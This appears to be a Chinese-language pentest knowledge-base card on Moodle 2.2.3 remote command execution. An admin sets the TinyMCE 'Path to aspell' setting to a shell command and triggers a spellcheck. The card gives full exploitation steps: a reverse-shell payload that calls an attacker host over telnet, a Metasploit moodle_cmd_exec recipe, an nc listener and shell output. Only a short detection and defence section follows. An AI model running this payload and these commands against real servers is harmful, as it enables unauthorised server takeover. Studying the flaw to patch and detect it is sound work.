---
id: web-php-rce-moodle-tinymce-spellchecker-aspell-path-rce
title: Moodle TinyMCE 拼写检查器 aspell 路径注入：管理员把 Path to aspell 改成 shell 命令，触发拼写检查即执行
type: scenario
domain: web
path: web/php/rce
technique: moodle-tinymce-spellchecker-aspell-path-command-injection
tags:
- moodle
- php
- rce
- tinymce
- spellchecker
- aspell
- command-injection
- cms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: Moodle 2.2.3（原文实测版本）
verification:
  verified_by: verifier-V608
  verified_at: '2026-11-12T19:38:53+08:00'
  notes: '已对照原文与全部43张截图核对：img28 Environment 页显示 Moodle version 2.2.3 (Build 20120514)，affected_versions「Moodle 2.2.3（原文实测版本）」属实（原文搜索截图亦提及 2.2.3、2.6.2 受影响）；img33 Spell engine=PSpellShell、img32 Path to aspell=sh -c ''{sleep 4062;telnet 192.168.230.132 4444}while : ; do sh & break;''、img34 博客条目 xxxx/2v1314154151516 触发、img35 回连 www-data（tinymce spellchecker 目录）均与卡一致；img31 确认 MSF exploit/multi/http/moodle_cmd_exec 参数（admin/gnocertdir/cmd/unix/reverse），原文该模块利用失败后手工流程成功；PoC 为结构化复现，未本机执行。'
url: /docs/web/php/rce/web-php-rce-moodle-tinymce-spellchecker-aspell-path-rce/
draft: false
kb_aliases:
- Moodle spellcheck RCE
- Moodle 2.2.3 命令执行
- moodle_cmd_exec
- Path to aspell 注入
- PSpellShell 命令执行
- TinyMCE spellchecker RCE
---

## 一句话结论

拿到 Moodle 管理员账号后，在 Site administration → Server → System paths 里把 “Path to aspell” 改成一段 shell 命令，并把 TinyMCE 的拼写引擎设为 PSpellShell；随后在博客/消息编辑器里触发拼写检查，Moodle 会以 Web 进程身份执行该“aspell 路径”，直接获得 www-data Shell（MSF 的 `exploit/multi/http/moodle_cmd_exec` 即自动化此流程）。

## 原理

- Moodle 的 TinyMCE 拼写检查功能依赖外部拼写程序，管理员可在后台配置 aspell 可执行文件路径（`Path to aspell`）。
- 拼写检查请求（spellchecker.php）会按该配置拼出命令并交给 shell 执行；配置项只被当作字符串路径，没有校验是否为合法可执行文件、也没有阻止 shell 元字符。
- 攻击者（或已拿到管理员账号的人）把该值设成 `sh -c '{...}while : ; do sh & break;'` 一类命令，触发拼写检查时就在服务器上执行，权限为 PHP/Web 服务进程（原文为 www-data）。
- 为什么成立：这是“管理员可控的配置字符串进入 shell”的典型命令注入；Moodle 把“管理员”视为高信任角色，但管理员配置本不应等价于系统命令执行，一旦后台账号被接管（弱口令、凭据泄露），即可升级为系统 Shell。
- 原文路径：Moodle 2.2.3 → Site administration → Plugins → Text editors → TinyMCE HTML editor，将 Spell engine 改为 `PSpellShell`；再到 Server → System paths 设置 aspell 路径；最后新建博客条目触发拼写检查。MSF `exploit/multi/http/moodle_cmd_exec` 用 admin 凭据、`targeturi /gnocertdir`、`cmd/unix/reverse` 自动化同样步骤。

## 触发条件

- 已获得 Moodle 管理员（site admin）账号；或目标使用默认/弱管理员口令。
- Moodle 版本存在该配置项且拼写检查插件启用（原文 2.2.3）。
- TinyMCE 拼写引擎可切换为 PSpellShell（后台允许修改编辑器设置）。
- Web 进程具备执行 shell 的权限（常规 PHP 环境即可），且出站/回连可达攻击机。
- 若用 MSF 模块，需要正确的 `RHOSTS`、`TARGETURI`（如 `/gnocertdir`）与管理员凭据。

## 利用步骤

1. 用管理员账号登录 Moodle，确认版本：Site administration → Server → Environment 显示 `Moodle version 2.2.3`（或其他含该配置项版本）。
2. 修改拼写引擎：Site administration → Plugins → Text editors → TinyMCE HTML editor → Spell engine 选 `PSpellShell`，保存。
3. 在 Site administration → Server → System paths 的 “Path to aspell” 填入命令。原文使用：
   `sh -c '{sleep 4062;telnet 192.168.230.132 4444}while : ; do sh & break;'`
   含义是先等待回连监听就绪，再循环起 shell 并跳出。
4. 攻击机监听对应端口（原文 4444/6666）。
5. 新建博客条目或消息，在编辑器中输入会触发拼写检查的文本（原文 “xxxx”/“2v1314154151516”），点击拼写检查图标；服务器执行配置的 aspell 路径，反弹回 www-data Shell。
6. 若手工步骤不通，可改用 MSF：
   ```
   use exploit/multi/http/moodle_cmd_exec
   set username admin
   set password <admin-password>
   set rhosts <target>
   set targeturi /gnocertdir
   set payload cmd/unix/reverse
   set lhost <attacker>
   run
   ```

## PoC

```text
# 后台配置（等价操作）
Site administration -> Plugins -> Text editors -> TinyMCE HTML editor
  Spell engine = PSpellShell

Site administration -> Server -> System paths
  Path to aspell = sh -c '{sleep 4062;telnet ATTACKER 4444}while : ; do sh & break;'
```

```bash
# 攻击机监听
nc -lvnp 4444
```

```text
# 触发：博客/消息编辑器输入任意文本 -> 点击拼写检查
# 回连后
whoami
www-data
```

说明：PoC 为原文靶场流程的结构化复现，IP/口令已泛化；配置项会执行系统命令，仅用于授权测试，未在本机执行。

## 变体与关联

- 变体：不同 Moodle 版本的菜单路径可能变化（Plugins → Text editors → TinyMCE），但“aspell 路径 → shell”原理一致；也可用其他依赖外部程序的编辑器配置项。
- 变体：MSF 模块失败时，手工按后台配置 + 触发拼写检查往往更可靠；注意 `TARGETURI` 必须包含 Moodle 安装子目录。
- 关联：[[web-php-rce-drupal-cve-2018-7600-drupalgeddon2]]（另一 PHP CMS 的 RCE）、[[web-generic-auth-password-reset-host-header-poisoning]] 等凭据获取卡（本卡前置为管理员账号接管）。
- 边界：非管理员无法修改该配置；拼写检查被禁用、aspell 路径被校验/白名单、或 Web 进程被严格限制执行命令时，本链不成立。

## 检测与防御

- 检测：后台配置变更日志中出现 `Path to aspell` 被改为含 `sh`、`;`、`&`、`telnet`、`nc` 等内容的字符串；Web 进程派生 shell/网络连接；TinyMCE spellcheck 请求后出现异常子进程。
- 防御：升级/修补 Moodle，限制该配置项为固定路径并校验可执行文件；禁用不必要的拼写检查；管理员使用强口令与 MFA；Web 进程低权限、出站受限。
- 加固：监控后台设置变更与管理员登录；WAF 无法覆盖此类后台功能，重点是权限与配置审计。
